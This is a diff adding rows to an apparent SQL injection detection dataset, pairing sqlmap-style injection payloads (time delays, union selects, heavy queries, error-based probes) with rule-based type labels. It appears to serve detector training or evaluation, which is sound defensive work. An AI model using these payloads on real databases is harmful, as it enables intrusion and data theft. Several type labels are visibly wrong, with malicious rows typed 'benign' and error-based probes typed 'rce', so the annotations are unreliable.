@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+6450,"1"" where 2619 = 2619 and 2823 = 5100#",1,,boolean_blind,generic,0.95,2619 = 2619 and detected — boolean_blind injection (priority 8) on generic,rule-based
+6451,1' ) where 2330 = 2330 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6452,"make_set ( 6174 = 9734,1 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6453,1'|| ( select 'ussi' where 8958 = 8958,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6454,"1' ) and elt ( 7554 = 6257,6257 ) and ( 'bpzm' = 'bpzm",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+6455,"1"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6456,"1"" where 7110 = 7110",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6457,"1"" where 4652 = 4652 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
+6458,"-5317' ) ) union all select 7673,7673,7673,7673,7673,7673#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6459,1'|| ( select 'ywjy' where 7579 = 7579,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6460,"1 ) where 9010 = 9010 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+6461,"1%' ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( '%' = '",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
+6462,"-6254%' ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+6463,"1%' ) union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6464,1' where 5819 = 5819 and ( 1275 = 4759 ) *4759--,1,,boolean_blind,generic,0.95,5819 = 5819 and detected — boolean_blind injection (priority 8) on generic,rule-based
+6465,1' rlike ( select ( case when ( 6855 = 1056 ) then 1 else 0x28 end ) ) and 'pmrz' like 'pmrz,1,,boolean_blind,generic,0.95,"like ', rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
+6466,"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
+6467,"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""vzud"" like ""vzud",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
+6468,1 ) ) as syot where 1199 = 1199,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6469,"iif ( 1095 = 2853,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
+6470,"1"" ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ""gixv"" = ""gixv",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6471,1 ) where 9821 = 9821 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6472,select ( case when ( 4719 = 8852 ) then 1 else 4719* ( select 4719 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6473,"1"" ) ) ) union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6474,"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'qvyq' like 'qvyq",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+6475,"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and 'zlxw' = 'zlxw",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
+6476,-8292%' ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6477,"1%' ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
+6478,"-5728 ) where 8663 = 8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6479,"1"" ) where 4180 = 4180 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,4180 = 4180 or detected — boolean_blind injection (priority 8) on generic,rule-based
